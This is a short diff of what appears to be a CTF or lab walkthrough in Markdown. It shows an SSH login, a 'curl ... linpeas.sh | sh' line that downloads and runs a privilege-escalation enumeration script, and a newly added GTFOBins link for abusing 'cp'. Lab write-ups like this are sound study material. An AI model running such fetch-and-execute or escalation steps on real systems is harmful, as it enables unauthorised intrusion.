@@ -35,3 +35,8 @@ ssh kevin@62.173.140.174 -p 18122
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
 ```
 ![image](https://github.com/stensil4rt/CodeBy/assets/62753044/c2305b25-6448-4fb9-a9cb-2b1184d1afa0)
+
+https://gtfobins.github.io/gtfobins/cp/
+
+![image](https://github.com/stensil4rt/CodeBy/assets/62753044/f60ee4cb-5bc7-4eb9-ab0d-19ef39861037)
+
